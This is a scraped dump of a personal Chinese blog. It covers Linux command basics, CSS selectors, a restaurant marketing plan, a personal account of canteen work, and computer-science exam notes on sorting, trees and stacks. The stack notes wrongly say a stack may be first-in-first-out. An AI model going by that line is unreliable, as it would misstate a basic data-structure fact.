COMMAND:所执行的指令 动态显示进程信息 top 1top 结束进程 kill 12kill 进程idkill -9 进程id #强制结束 后台运行 &amp;、jobs、fg 12345 ./hello.exe &amp; #表示后台运行 jobs #查看后台程序 fg 后台编号 #把后台程序调出前台 关机重启 reboot shutdown init 1234567reboot #重启shutdown -r now #重启shutdown -h now #立刻关机shutdown -h 20:25 #在20:25分关机shutdown -h +10 #十分钟后关机init 0 #关机init 6 #重启 字符界面和图像界面切换 redhat平台 12init 3 #字符界面init 5 #图形界面 Ubuntu快捷键切换 ctrl+alt+F2 字符界面 ctrl+alt+F1 图像界面 检测硬盘空间 df 1df -h 检查目录所占磁盘空间:du 1du -h 目录 -a 递归显示指定目录中各文件和子目录中文件占用的数据块 -s 显示指定文件和目录占用的数据块 -b 以字节为单位显示磁盘占用情况 -h人性化输出大小 安装软件 rpm rpm [选项][软件包名] -i指定安装的软件包 -h显示安装过程及进度 -v 显示安装的详细信息 -q查询系统是否已安装指定软件包 -a 查看系统已安装的软件包 -e 卸载软件 --nodeps 配合-e使用 ,强制卸载,不检查依赖项 --force 强制操作,如强制安装或卸载 1rpm -ihv ./aaa.rpm 获取最新的软件包的列表 1sudo apt-get update 从源中添加xxx软件 1sudo apt-get install xxx 删除xxx软件 1sudo apt-get remove xxx dpkg Debian Linux系统用来安装、创建和管理软件包的实用工具。 语法 dpkg(选项)(参数) 选项 -i：安装软件包； -r：删除软件包； -P：删除软件包的同时删除其配置文件； -L：显示于软件包关联的文件； -l：显示已安装软件包列表； --unpack：解开软件包； -c：显示软件包内文件列表； --confiugre：配置软件包。 参数 Deb软件包：指定要操作的.deb软件包。 实例 12345678910dpkg -i package.deb #安装包dpkg -r package #删除包dpkg -P package #删除包（包括配置文件）dpkg -L package #列出与该包关联的文件dpkg -l package #显示该包的版本dpkg --unpack package.deb #解开deb包的内容dpkg -S keyword #搜索所属的包内容dpkg -l #列出当前已安装的包dpkg -c package.deb #列出deb包的内容dpkg --configure package #配置包","categories":[{"name":"linux","slug":"linux","permalink":"https://xiaowuyoucy.github.io/categories/linux/"}],"tags":[]},{"title":"属性选择器","slug":"html-css00022属性选择器","date":"2020-06-04T04:39:16.000Z","updated":"2020-06-04T04:56:52.137Z","comments":true,"path":"2020/06/04/html-css00022属性选择器/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/06/04/html-css00022属性选择器/","excerpt":"","text":"属性选择器 在HBuilder中按ctrl+shift+f可以折叠代码 title属性 可以给标签起一个标题名字 鼠标放上去会显示属性值 1&lt;p title=\"123\"&gt;zzz&lt;/p&gt; 元素名[属性名] 选择含有指定属性的元素 123456p[title]&#123;color: yellow;&#125;p[class]&#123;color: yellow;&#125; 元素名[属性名=属性值] 选择含有指定属性和属性值的元素 123456p[title=\"123\"]&#123;color: yellow;&#125;p[class=\"111\"]&#123;color: yellow;&#125; 元素名[属性名^=属性值] 选择属性值以指定值开头的元素 123456p[title^=\"a\"]&#123;color: yellow;&#125;p[class^=\"b\"]&#123;color: yellow;&#125; 元素名[属性名$=属性值] 选择属性值以指定值结尾的元素 123456p[title$=\"a\"]&#123;color: yellow;&#125;p[class$=\"b\"]&#123;color: yellow;&#125; 元素名[属性名*=属性值] 选择属性值中含有某值的元素的元素 123456p[title*=\"a\"]&#123;color: yellow;&#125;p[class*=\"b\"]&#123;color: yellow;&#125; 123456789101112131415161718192021222324252627282930313233343536373839&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;&lt;/title&gt; &lt;style type=\"text/css\"&gt; p[class]&#123; background-color: yellow; &#125; p[title=\"a\"]&#123; background-color: red; &#125; p[title^=\"ac\"]&#123; background-color: green; &#125; p[title$=\"bc\"]&#123; color: red; &#125; p[title*=\"z\"]&#123; color: brown; &#125; &lt;/style&gt; &lt;/head&gt; &lt;body&gt; &lt;p title=\"acc\"&gt;123&lt;/p&gt; &lt;p title=\"acc\"&gt;123&lt;/p&gt; &lt;p title=\"abc\"&gt;123&lt;/p&gt; &lt;p title=\"abc\"&gt;123&lt;/p&gt; &lt;p title=\"a\"&gt;123&lt;/p&gt; &lt;p class=\"bc\"&gt;123&lt;/p&gt; &lt;p class=\"bc\"&gt;123&lt;/p&gt; &lt;p title=\"azs\"&gt;123&lt;/p&gt; &lt;p title=\"aza\"&gt;123&lt;/p&gt; &lt;p title=\"azc\"&gt;123&lt;/p&gt; &lt;/body&gt;&lt;/html&gt;","categories":[{"name":"HTML/CSS","slug":"HTML-CSS","permalink":"https://xiaowuyoucy.github.io/categories/HTML-CSS/"}],"tags":[]},{"title":"伪元素","slug":"html-css00021伪元素","date":"2020-06-04T04:12:31.000Z","updated":"2020-06-04T04:27:13.487Z","comments":true,"path":"2020/06/04/html-css00021伪元素/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/06/04/html-css00021伪元素/","excerpt":"","text":"伪元素 :first-letter 首字符伪元素 修改第一个字符的样式 12元素名:first-letter&#123;&#125; :first-line 首行伪元素 修改首行的样式 12元素名::first-line&#123;&#125; :before 表示元素最前面部分 :before和:after通常搭配content来使用 123p:before&#123;content: \"2133\";&#125; :after 表示元素最后面 123p:after&#123;content: \"2133\";&#125; 123456789101112131415161718192021222324252627282930313233&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;&lt;/title&gt; &lt;style&gt; p:first-letter&#123; color: red; font-size: 50px; &#125; p:first-line&#123; background-color: saddlebrown; &#125; p:before&#123; font-size: 50px; content: \"www\"; &#125; p:after&#123; font-size: 50px; content: \".com\"; color: green; &#125; &lt;/style&gt; &lt;/head&gt; &lt;body&gt; &lt;p&gt;12342112423141242&lt;/p&gt; &lt;/body&gt;&lt;/html&gt;","categories":[{"name":"HTML/CSS","slug":"HTML-CSS","permalink":"https://xiaowuyoucy.github.io/categories/HTML-CSS/"}],"tags":[]},{"title":"元素的伪类选择器","slug":"html-css00020元素的伪类选择器","date":"2020-05-30T11:43:22.000Z","updated":"2020-05-30T12:01:39.341Z","comments":true,"path":"2020/05/30/html-css00020元素的伪类选择器/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/05/30/html-css00020元素的伪类选择器/","excerpt":"","text":"元素的伪类选择器 伪类专门用来表示元素的一种特殊的状态. 比如访问过的超链接等 :link表示普通的链接（没访问过的超链接） 123a:link&#123;color:yellow;&#125; :visited表示访问过的超链接 浏览器是通过历史记录来判断一个链接是否访问过. 由于隐私的原因，所以visited这个伪类只能修改链接的颜色 123a:visited&#123;color:red;&#125; :hover表示鼠标移入的状态 123a:hover&#123;color:red;&#125; :active表示的是超链接被点击的状态. 123a:active&#123;color:red;&#125; :hover和:active也可以为其他元素设置 123456p:hover&#123;color:red;&#125;p:active&#123;color:red;&#125; IE6中,不支持对超链接以为的元素设置:hover和:active :focus获取焦点 123input:focus&#123;background-color:yellow;&#125; ::selection为p标签中选中的内容使用样式 可以用::selection伪类 注意:这个伪类在火狐浏览器中需要采用另外一种方式编写::-moz-selection 123456p::-moz-selection&#123;&#125;p::selection&#123;&#125;","categories":[{"name":"HTML/CSS","slug":"HTML-CSS","permalink":"https://xiaowuyoucy.github.io/categories/HTML-CSS/"}],"tags":[]},{"title":"后代选择器和子元素选择器","slug":"html-css00019后代选择器和子元素选择器","date":"2020-05-30T09:52:56.000Z","updated":"2020-05-30T10:04:18.151Z","comments":true,"path":"2020/05/30/html-css00019后代选择器和子元素选择器/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/05/30/html-css00019后代选择器和子元素选择器/","excerpt":"","text":"后代选择器和子元素选择器 父元素 直接包含子元素的元素叫做父元素 子元素 直接被父元素包含的元素是子元素 祖先元素 ​ 直接或间接包含后代元素的元素叫做祖先元素 ​ 一个元素的父元素也是它的祖先元素 后代元素 ​ 直接或间接被祖先元素包含的元素叫做后代元素 ​ 子元素也是后代元素 兄弟元素 拥有相同父元素的元素是兄弟元素 后代元素选择器 作用：选中指定元素内的指定后代元素 语法： 12祖先 后代&#123;&#125; 12345678910111213141516171819&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;&lt;/title&gt; &lt;style&gt; div span&#123; background-color: red; &#125; &lt;/style&gt; &lt;/head&gt; &lt;body&gt; &lt;div&gt; &lt;span&gt;我是div的后代&lt;/span&gt; &lt;p&gt;我也是div的后代&lt;/p&gt; &lt;p&gt;&lt;span&gt;我span也是div的后代&lt;/span&gt;&lt;/p&gt; &lt;/div&gt; &lt;/body&gt;&lt;/html&gt; 子元素选择器 ​ 作用：选中指定父元素的指定子元素 ​ 语法： 123父元素&gt;子元素&#123;&#125; 123456789101112131415161718&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;&lt;/title&gt; &lt;style&gt; div&gt;span&#123; background-color:red; &#125; &lt;/style&gt; &lt;/head&gt; &lt;body&gt; &lt;div&gt; &lt;span&gt;我是div的直接子元素&lt;/span&gt; &lt;p&gt;&lt;span&gt;我span不是div的直接子元素&lt;/span&gt;&lt;/p&gt; &lt;/div&gt; &lt;/body&gt;&lt;/html&gt;","categories":[{"name":"HTML/CSS","slug":"HTML-CSS","permalink":"https://xiaowuyoucy.github.io/categories/HTML-CSS/"}],"tags":[]},{"title":"关于MoTa利用互联网","slug":"关于摩打利用互联网的战略","date":"2020-05-09T15:02:07.000Z","updated":"2020-05-09T17:24:44.044Z","comments":true,"path":"2020/05/09/关于摩打利用互联网的战略/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/05/09/关于摩打利用互联网的战略/","excerpt":"","text":"关于MoTa利用互联网 摩打需要拥有自己的官方网站以及公众号 以下内容并非固化思维，可自行天马行空，增加或减少选项。 官方网站内容 用户信息 活动信息 最新消息 菜品展示 预定系统 支付系统 招聘信息 积分系统 会员系统 用户信息: 收集客户的姓名,电话,性别，生日 活动信息: 展示关于摩打新出的活动,吸引客户参与. 最新消息: 摩打有新出的菜式或与其相关的消息 菜品展示: 可以将摩打的所有菜品的图片都发布到网站，供客户参考并选择。 预定系统： 给客户提供预约服务，可提前一星期以内或更久的预定。 需要用户给出预定的时间，以及菜品。 需要用户给出定金或菜品全金。 如果用户到点未到，可根据情况作出部分退款 优势：客户到点就可马上就餐，缩短客户等待的时间 缺点：客户已预约且未到的情况，需要有一套方案去处理 支付系统： 可以在网站接如第三方平台的支付，如支付宝，微信，银联。 技术性要点： 支付成功：我们官方平台需要做些相应处理 招聘信息： 可在官方网站发布人才招聘信息。 积分系统： 假设用户累计到XXX分，可以赠送指定菜品或物品 积分衰减（可选）：如果用户在指定时间内（月或季度）未来本店消费，将衰退一定的积分。 积分可以是1元=1积分，或x元 = y积分（根据情况来定制） 会员系统： 每个新用户或老用户都可以免费成为新会员。 会员可分等级，等级越高，享受到的优惠越多。 等级可按照用户总消费金额上下浮度来决定。 会员系统与积分系统交互使用，既会员系统包含积分系统 会员等级可按照月或季度衰减或增加。 挽留老客户以及吸引新用户 挽留老用户： 先保证服务质量以及菜品质量 新鲜感 惊喜度 客户口味信息 天下没有吃不腻的食物，唯有吃不腻的创新，所以需要不断创新 感受度（如环境、温度等） 吸引新用户（可用于外卖）： 充分平台吸引： 可利用官方网站，公众号，淘宝，美团，饿了么等平台（最好是广州市区的，其他市区的也可，但这是伏笔）。 从老客户中挖掘新客户： 例如： 老客户介绍了一名新客户来本店消费，可以赠送折惠劵或现金劵、积分等奖励。 这需要有一套完整的电子系统支撑，以防止客户作弊 新用户被登记后便自动成为老用户，如上所述，老用户可介绍新用户 活动性吸引 写一篇关于介绍摩打的文章，散播到朋友圈，要求客户转发的文章点赞数量达到我们的要求，可赠送xxx菜品或礼物、优惠劵、积分等，每天需要限制人数，如前X名达到我们要求且先到达门店的客户才可享受前面所述的活动。达到点赞数目却不是最先前X名到达门店的可赠送某些物品或获得少量积分等。 限时或限数量抢购： 新出的菜品或xxx菜品打折,可限制时间或数量。 策划指定节假日活动 根据店面人员已经情况策划。 打折与免单活动（需要微信小程序支撑）： 活动要求： 在本店正在消费的客户 在规定的时间内，客户转发本店文章，并且该文章已让客户的朋友阅读数量达到xxx 限制免单名额和打折名额。如免单名额一天为X个，打折名额一天为Y个 每天公开前一天的免单名单以及打折名单（打消客户的质疑度，可建立一个当天所有用户的微信群，在群里发布消息，这样可以方便发布二次推广） 食品网站参考： 海底捞 https://www.haidilao.com/zh/gyhdl/index.html 肯德基 http://www.kfc.com.cn/kfccda/index.aspx 必胜客 http://www.pizzahut.com.cn/ 星巴克 https://www.starbucks.com.cn/ 网站开发渠道: 一般商家会根据你的要求提供一条龙技术服务的。 预估价格1k以内或1k~2k之间。 上面所述的可自行增加、删除与采纳、且所有的前提在于服务质量与菜品质量","categories":[],"tags":[]},{"title":"在某某食堂的经历","slug":"在某某食堂的经历","date":"2020-05-06T17:55:39.000Z","updated":"2020-05-11T18:35:42.887Z","comments":true,"path":"2020/05/07/在某某食堂的经历/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/05/07/在某某食堂的经历/","excerpt":"","text":"如果使用手机观看，在文章接近末尾时，请使用横屏阅读。以避免排版结构错误！ 事情的开始 原本打算2020年成立的工作室的，可造化弄人啊。千算万算，还是算漏了天灾。所以导致我们的工作室一直迟迟开不起来。就这样我在家里一直待到三月份才回广州，我自己意识到这个时候想进公司还是有点困难的，因为目前很多公司都裁员了，就连教育行业兄弟连公司也倒闭了。所以我只能先随便找一份工作让自己先生存下来。 回到广州的时候，广州还是属于一级防护，很多村子都封了，外地人基本都进不去。那时候可把我愁坏了，因为很多旅店都是要进村的，还好最后还是被自己混进去了，然后拿到某个村子的通行证。这也多亏了自己学过社会工程学。其实感觉很矛盾，就算拿到了一个村子的通行证，证明了自己是健康的，当去其他村的时候还是不能进。 在住旅店的这段时间找了很多工作，其实这些工作很多都是工厂和服务员的，没办法，我回来的时候还没有正式开始复工。我面试了很多工作，第一份是仓库管理的，后面因为某些原因就没去了。后面我朋友介绍了一份某某食堂服务员的工作给我，面试我的是一位叫小萱的小姐姐，那时候我们还是在线面试的，开视频的时候，就问了一些问题，之后就叫我们去办健康证了，再之后就是让我们去总部培训，培训的时候那叫一个精彩呀，满满的鸡汤和大饼（自己百度）。 入职的第一天 当我踏进某某食堂的第一步的时候，我觉得这里面的人都很好呀，特别是我们的店长，那个笑脸真的让人意外的感觉到亲切的感觉。 上岗的时候，楼面的李某某主管就安排了我补家私，然后家私没有补完就叫我去洗毛巾，洗完毛巾之后叫我去收桌，收桌之前一个叫啊西的经理和李某某主管一直强调说我们这里要的是效率，效率，效率，这时我心里那个叫惨呀。 其实我感觉日企文化的公司都很干净，我们收桌的时候要带黄色的一次性手套，而弄食材的时候必须带透明的手套，因为疫情期间嘛，这方面我感觉到了人性化，为员工着想的同时，也给顾客带来了健康。唯一的缺点是规矩真的很多，很多规矩都是很死板的，这也是我一直不想进入日企或日企文化公司的原因。没办法我还是来了。随后我发现，天啊，这里的桌是收不完的，从上班一直收到下班，我心里那个叫苦呀，可能是之前没有做好心理准备吧。随后又发现，每当遇见阿西的时候，她都会对我说加油哦。我心想，我会不会以后听到加油两个字都毛骨悚然呀。不过这里的正能量还是挺多的。感觉来到这里，就是再重温一遍学生会的感觉。比如见到人就要打招呼，哪怕是见到我们内部的员工也是要打招呼，发现某个员工的错误马上就指出来（这与其他职场完全不一样）有些地方是不会当面马上大声的指出来的，因为怕得罪人嘛。特别是在有管理层的人在旁边的时候，这样会让犯错误的那个同事很难堪的，表面上是不会怨恨，可背后呢？谁也不敢保证吧？这里也是对一个人情商的一个大考场地。 亮点 这里的服务与普通餐饮的行业相比，可以说是所向披靡的。 卫生方面在我所接触过的餐饮行业中也是数一数二的。 小伙伴累的时候，某些管理层会给小伙伴一罐红牛或者营养快线，这点心里还是会觉得自己的付出还是有被认可的。被认可不一定是给物质，还可以是精神上的认可。比如说xxx你今天表现得很棒哦！你今天的努力，我都有看到哦。 大部分小伙伴都很热情。 很多小伙伴都很上进,虽然 有些时候上进的方式缺少了情商的方式，但拥有上进的心就是一种正能量，能量是会传递的。 管理层的人都比较友善，没有一副高高在上的感觉，这点是我最欣赏的地方，因为现实中很少这样的管理者。 大波店长的笑容可以治愈每个人的心，每当不开心时，他的笑容都能让人觉得很欣慰。因为工作中总会积累到一些负面的情绪，可他这么一笑，所有的负面都烟消云散了，在职场上，一位领导对你的微笑意味着对你的认可，虽然不知道他的笑意是什么，但总要往好处想嘛。人们常说微笑是一种无穷大的能量，它可以让你战胜一切，所向披靡。 还有很多很多，我就先省略掉吧！ 缺陷 为什么这里的女生厕所要男生去洗，这对男员工心理不舒服的同时还给顾客带来不舒服。每次搞完厕所出来的时候，遇到哪些女顾客时，她们都会带着一种异样的眼光看着我们。难道某某食堂这里没有女生吗？我还记得有一次，我搞完厕所出来的时候，有一位女生很大声的说，“咦，女厕所居然有男生的”，这时候我心里贼尴尬呀。 这里的员工餐贼不公平，除了第一批吃的，其他批次吃时可能渣都没有了，更别说最后一批了。我提前半个小时公司了，发现菜和饭一点都不剩了，这还是人做的事情么？然后让我挨饿上班工作，还好一位叫鱼子酱的去熟食窗口那里打了一位饭并且反应给啊西经理让她让我去休息室吃。要不然我还真担心自己会饿晕在那里。 某位经理说我没有融入进这群伙伴里，其实我觉得这不是一个人的问题吧，毕竟一个巴掌是拍不响的。他们老员工不接纳我们这些新员工，我们不管做什么都融入不进去呀。 我发现这里收桌的人都是最低等最低贱的，恰好我就是那个收桌的。任何人都可以指挥我们这个岗位的人去做事，哪怕这些不在我们份内的事，还是要我们做。叫我们帮他们很容易，叫他们帮我们那个叫困难呀。 某位经理真的是用人千疑啊，有一天肚子不舒服，两个小时上了两次厕所，他居然说怎么你又上厕所，天天上厕所。我杀人的心都有了，怀疑人家偷懒就直说嘛。 停下来就是闲的。有一次忙得不可开交了，好不容易停下来站了一会，某位经理上来就直接说，你这么闲，去扫一下地。这时心里一万句cnm啊，我忙的时候，你的眼睛去哪里了？莫非是被卖冰棍的老太太当冰块串起来了？ 刚刚入职工作的第三天，没有人教我们看班表，直接就发一张图片过来，然后第二天就问我们为什么没上班 ，我们一脸懵逼呀。鬼知道那张图片是要来干嘛的？ 普通员工的事情，管理层的人不上心。最记得的是宿舍的WiFi永远都是马上就来装的，结果一天拖一天，一直拖了大半个月才装好。如果是这样，直接就说公司不装宿舍WiFi嘛。 管理层的意见没有统一化，比如收夜最后补家私的时候有些经理说全部要补进消毒柜，有些经理说只补筷子勺子，和酱油碟就可以了。这样我们听谁的？ 啊姨放家私的窗口永远都是有零碎的家私。 厨余垃圾的那个桶永远都是有生活垃圾的。只要收桌的人离开一会回来马上就能看到有生活垃圾了。然后我们每次都要伸手进厨余垃圾桶里捡起来，所以我们收桌的小伙伴还有另外一个称呼“捡垃圾的垃圾佬”。 有一次有一位小伙伴不小心把家私弄掉了，刚刚好砸在我头上，当时那个叫疼啊，然后某位经理就催我快点收桌，我都和他说了我被砸到头了，他还再催我去收桌，当时觉得超级憋屈呀。如果不是因为差不多到离职那天了，我绝对会当场发飙的。 下班搞卫生的时候，安排到我扫地，我就拿出手机来照着地上来扫，有个叫渣女就不断的讽刺，说哇你好认真哦，扫个地还用电筒照着。我都是打算要走的人了，是和你抢功劳呢？还是怕我和你竞争升职呢？我都一而再再而三的忍让她了，她还咄咄逼人，最后我还是爆发了，这是我来这某某食堂以来第一次发的脾气。说实话我本来就不容易发脾气的人，能把我逼到这种地步的人还真的是人才啊。 感觉这里的物料老是不足，例如 黄色手套，早几天前都说了手套快没了，还没用完了之后还没有买回来，然后不知道怎么突然又找到几包暂时能支撑着，谁知道他们还不会亡羊补牢，是不是每次都要等到危机来临的时候才去处理呢？这些是谁的责任呢？哪怕手套这些是采购买的，但管理层领导的工作是什么？带领好自己手下的同时是不是应该和其他部门交接好呀？ 有一次一位叫啊西的管理层领导叫我去女厕所搞卫生，搞完之后要拍照发在钉钉那个群上。刚刚好我搞完卫生拍好照走出去门口准备把照片发在钉钉上的时候，另外一位管理层的就马上说我玩手机了，根本就没有解释的机会，我只能说这个管理层领导也是个人才（蠢材）。 在我离职的那段时间，那些管理层的一直安排我收桌，收桌就算了。有一次整个场子就我一个收桌的，场子分三个区嘛，分别是ＡＢＣ区，Ａ区称为内场，因为内场一直很忙，收桌一直收个不停，吃宵夜的时候Ｃ区的小伙伴就开始抱怨我了，她说：我是不是得罪你了？为什么一直不过来Ｃ区收桌啊。这时我那个叫憋屈啊，我在内场忙得冒烟了，哪里还有时间去Ｃ区收桌啊！真的当我会分身啊？ E区真的很搞笑,每次下大雨都会淹水，这个问题其实也不是很复杂，既然不能改变建筑的结构，但可以软性的去解决问题。例如买些隔水的物品回来，如果每次下雨都让客人湿鞋或在水中进食，可想而知，这给客人的体验感是多差，这也是潜在的客户流失的存在。问题往往只有那么一两个，但解决问题的方法却可以有千万种。 最后的个人总结与感慨 上述的文字言语或许会比较偏激，这其中我自身也是有问题的，因为我缺乏在这里上进的动力，所以一直都很消沉。我的光芒也并没有在这里展现出来，因为这不是我的舞台。其实这里面大部分的同事都是蛮可爱的，还没有被尘世染化，正是他们的这份纯情的天真，才能勾起我曾在学生时代学生会的点点滴滴。可惜我不再是过往的那个我，而他们也不是我曾经的小伙伴。到最后我才发现最开始啊西总是对我喊的那句“加油哦！”并没有成为我心里最恐惧的话，而成为了我最难以忘怀的能量源泉。我知道自己是一个非常容易陷入感情却又难以自拔的人，所以我一直很抗拒自己的社交，所以这一次我狠下了心，并不想和他们有深入的交情。其实也挺矛盾的，明明不想成为这样的人，可却要伪装成这样的人，现在想想还是挺可笑的。我很清楚每个地方都会有矛盾、明中暗斗、误会等。但这并不影响他们的可爱。最后我还是没有留下点什么，悄然的离开了这个我最不喜欢也最不讨厌的地方。 假若有缘，我想我们还是不见了吧！ 祝愿你们前程似锦，面对困难不畏不惧。 记得要把微笑常挂在脸上哦！ 因为你们真的真的很可爱！ (*^o^)(^o^*) 最后我要对彩虹、小劳、西红柿、鱼子酱、文庆，博锐、肥龙、小弟，说声谢谢，你们身上各自的光芒，成功的留在了我的心里。当然不能忘记了我们的浩业大哥！大人物嘛总是要最后出场的。哈哈哈！","categories":[],"tags":[]},{"title":"算法","slug":"006算法","date":"2020-04-30T05:24:52.000Z","updated":"2020-05-08T17:45:29.234Z","comments":true,"path":"2020/04/30/006算法/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/04/30/006算法/","excerpt":"","text":"算法 查找与排序技术 顺序查找 顺序表又称为顺序搜索。 从表中的第一个元素开始比较，若相等则查找成功，若元素不存在，则查找失败。 当一个线性表的长度为n时，最坏情况下，查找一个元素需要比较n次 二分查找法 二分查找只适用于顺序存储的有序表。 步骤： 将x与线性表的中间元素进行比较： 若中间元素的值等于x，则说明查找成功，查找结束 若x小于中间元素的值，则在线性表的前半部分以相同的方法查找。 若x大于中间元素的值，则在线性表的后半部分以相同的方法查找。 这个过程一直进行到查找成功或子表长度为0（说明线性表中没有这个元素）为止。 最糟糕的情况需要查找log2n次。 交换类排序法 冒泡排序 通过相邻数据元素的交换逐步将线性表变成有序的。 从前往后，然后从后往前比较并交换元素。 最坏情况时要比较n(n - 1)/2 次，n代表线性表的长度。 快速排序 快速排序法是对冒泡排序法的改进，又叫作分区交换排序法。 基本思想如下： 从线性表中任意选取一个元素（通常选第一个元素），设为T，将线性表中小于T的元素移到T的前面，而大于T的元素移到T的后面，结果就将线性表分成了两部分（称为两个子表），T处于分界线的位置处，这个过程称为线性表的分割。通过对线性表的一次分割，就以T为分界线，将线性表分成了前后两个子表，且前面子表中的所有元素均不大于T，而后面子表中的所有元素均不小于T，然后用同样的方法对分割后的子表进行快速排序，直到各个子表的长度为1为止。 插入类排序法 简单插入排序法 简单插入排序法也叫直接插入排序法。 插入排序是指将无序序列中各元素依次插入到已经有序的线性表中。 希尔排序法 希尔排序法（Shell Sort）又称缩小增量排序法，它对简单插入排序做了比较大的改进。 其方法如下： 将整个无序序列分割成若干小的子序列分别进行简单插入排序。 时间复杂度: O（n1.5） 堆排序法 每个父节点同时大于等于两个子结点或每个父结点同时小于等于两个子结点的结构成为堆 时间复杂度: O（ nlog2n ） 考点总结 二分法查找只适用于顺序存储的线性表，且表中的元素必须按关键字有序（升序，但允许相邻元素值相等）排列； 在长度为n的有序线性表中进行二分查找其时间复杂度为O（ log2n ）。 交换类 冒泡排序：n(n-1)/2 快速排序：n(n-1)/2","categories":[{"name":"计算机公共基础","slug":"计算机公共基础","permalink":"https://xiaowuyoucy.github.io/categories/计算机公共基础/"}],"tags":[]},{"title":"树与二叉树","slug":"005树与二叉树","date":"2020-04-27T18:05:59.000Z","updated":"2020-04-27T19:31:29.546Z","comments":true,"path":"2020/04/28/005树与二叉树/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/04/28/005树与二叉树/","excerpt":"","text":"树与二叉树 树的基本概念 树（tree）是一种非线性结构。在树这种数据结构中，所有数据元素之间的关系具有明显的层次特点。 每一个结点只有一个前件，称为父结点。 没有前件的结点称为根节点。 每一个结点都可以有多个后件，它们都称为该结点的子结点。 没有后件的结点称为叶子结点。 一个结点所拥有的后件的个数称为该结点的度。 所有结点中的最大的度称为树的度 以某结点的一个子结点为根构成的树称为该结点的一棵子树。 叶子结点没有子树。 二叉树 二叉树的基本概念 二叉树的特点： 非空二叉树只有一个根结点 每一个结点最多有两棵子树，且分别称为该结点的左子树与右子树。 满二叉树与完全二叉树 满二叉树与完全二叉树是两种特殊的二叉树。 满二叉树 在一棵二叉树中，如果所有分支结点都存在左子树和右子树，并且所有叶子结点都在同一层上，这样的二叉树称为满二叉树。 完全二叉树 完全二叉树是指最后一层外，每一层上的结点数均达到最大值，而在最后一层上只缺少右边的若干结点。 满二叉树也是完全二叉树，而完全二叉树不一定是满二叉树 二叉树的基本性质 性质1：在二叉树中，第i层的结点数最多为2i-1个（i≥1） 性质2：在深度为k的二叉树中，结点总数最多为2k-1个（k≥1）。 性质3：对任意一棵二叉树，度为0的结点（既叶子结点）总是比度为2的结点多一个。 性质4： 具有n个结点的二叉树，其深度至少为[ log2n ] + 1，其中[log2n]表示取log2n的整数部分。 具有n个结点的完全二叉树的深度为[log2n]+1。 二叉树的存储结构 二叉树通常采用链式存储结构。 用于存储二叉树中各元素的存储结点。 由两部分组成：数据域与指针域。 二叉树遍历 按一定的次序访问二叉树中的每一个结点,使每个结点被访问一次且只被访问一次。 二叉树的遍历分为三种： 前序遍历 中序遍历 后序遍历 D，L，R D代表访问根结点 L代表遍历根节点的左子树 R代表遍历根节点的右子树 前序遍历：D L R 中序遍历：L D R 后序遍历：L R D 前序遍历(DLR) 先访问根节点，然后遍历左子树，最后遍历右子树；并且，在遍历左、右子树时，仍然先访问根结点，然后遍历左子树，最后遍历右子树。 前序遍历结果：ABDGCEHIF 中序遍历（LDR）： 首先遍历左子树，然后访问根节点，最后遍历右子树；并且，在遍历左、右子树时，仍然先遍历左子树，然后访问根结点，最后遍历右子树。 中序遍历结果:DGBAHEICF 后序遍历(LRD) 首先遍历左子树，然后遍历右子树，最后访问根节点；并且，在遍历左、右子树时，仍然先遍历左子树，然后遍历右子树，最后访问根结点。 后序遍历结果:GDBHIEFCA 考题 扇入代表前件 扇出代表后件","categories":[{"name":"计算机公共基础","slug":"计算机公共基础","permalink":"https://xiaowuyoucy.github.io/categories/计算机公共基础/"}],"tags":[]},{"title":"栈和队列","slug":"004栈和队列","date":"2020-04-25T03:17:47.000Z","updated":"2020-04-25T04:01:10.244Z","comments":true,"path":"2020/04/25/004栈和队列/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/04/25/004栈和队列/","excerpt":"","text":"栈和队列 栈及其基本运算 栈的基本概念 栈（stack）是限定仅在一端进行插入和删除运算的线性表。 在栈中，允许插入与删除的一端称为栈顶，而不允许插入与删除的另一端称为栈底。 栈的入口和出口是同一个口。 top=bottom=0的时候，说明栈是空的。 栈的基本运算 入栈，退栈与读栈顶元素。 入栈运算 入栈运算是指在栈顶位置插入一个新元素。 有两个基本操作： 将栈顶指针加1，top=top+1； 然后将新元素插入栈顶指针指向的位置； 退栈运算 取出栈顶元素，并赋值给某个变量 两个基本操作： 将栈顶元素赋值给变量 然后栈顶指针减1，top=top-1 读栈顶元素 将栈顶元素赋值给一个指定的变量且栈顶指针不会改变。 总结 栈是按照“先进后出”或先进先出的原则组织数据的线性表 在栈的入栈和退栈的运算当中，栈底指针bottom维持不变。 因为栈能保存数据，因此栈具有记忆作用 栈内的元素个数计算：|TOP-BOTTOM|+1,其中BOTTOM&gt;=1,如果栈当中TOP=BOTTOM=0说明栈是空的 栈是线性结构，在计算机中担当着临时存储的功能。 队列及其基本运算 队列的基本概念 队列（queue）是限定仅在表的一端进行插入，而在表的另一端进行删除的线性表。 在队列中，允许插入的一端称为队尾，允许删除的一端称为队头。 队列又称为“先进先出”或&quot;后进后出&quot;的线性表。 在队列中，通常用指针front指向队头元素的前一个位置，用rear指向队尾最后一个元素。 循环队列 循环队列元素个数计算: 循环队列中元素的个数=rear（尾）- front（头）。 rear-front为正数时，便是循环队列的元素个数。 rear-front为负数时,需要再加上循环队列的容量. rear-front为零时,说明要么队列是空的,要么是满的.","categories":[{"name":"计算机公共基础","slug":"计算机公共基础","permalink":"https://xiaowuyoucy.github.io/categories/计算机公共基础/"}],"tags":[]},{"title":"数据结构与算法","slug":"003数据结构与算法","date":"2020-04-22T17:58:30.000Z","updated":"2020-04-25T03:16:35.920Z","comments":true,"path":"2020/04/23/003数据结构与算法/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/04/23/003数据结构与算法/","excerpt":"","text":"数据结构与算法 算法的概念 解题方案的准确而完整的描述. 